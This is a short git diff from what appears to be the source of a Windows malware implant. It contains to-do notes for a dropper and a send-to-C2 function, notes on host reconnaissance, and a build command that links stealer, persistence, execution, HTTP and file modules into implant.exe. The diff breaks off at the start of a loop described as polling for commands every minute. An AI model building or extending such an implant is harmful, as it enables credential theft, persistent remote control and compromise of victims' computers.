@@ -4,8 +4,6 @@
 //Implement Dropper
 //Implement sendtoC2
 
-//FileEnum
-
 /*
 Notes: GatherInfo - 
 [Currently has Computer name, username, and privileges]
@@ -70,8 +68,7 @@ Expected Check in: When should you expect to see the agent again?
 */
 
 
-// x86_64-w64-mingw32-g++ implant.cpp stealer/stealer.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/aes_gcm.cpp http/http.cpp persist/persist.cpp execute/execute.cpp situational_awareness/GatherInfo.cpp  -lwinhttp  -lbcrypt -lcrypt32  -static -luserenv -o implant.exe  
-
+// x86_64-w64-mingw32-g++ implant.cpp stealer/stealer.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/aes_gcm.cpp http/http.cpp persist/persist.cpp execute/execute.cpp situational_awareness/GatherInfo.cpp file/file.cpp  -lwinhttp  -lbcrypt -lcrypt32  -static -luserenv -o implant.exe  
 void IWillRunForever(void){
     while(true){
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
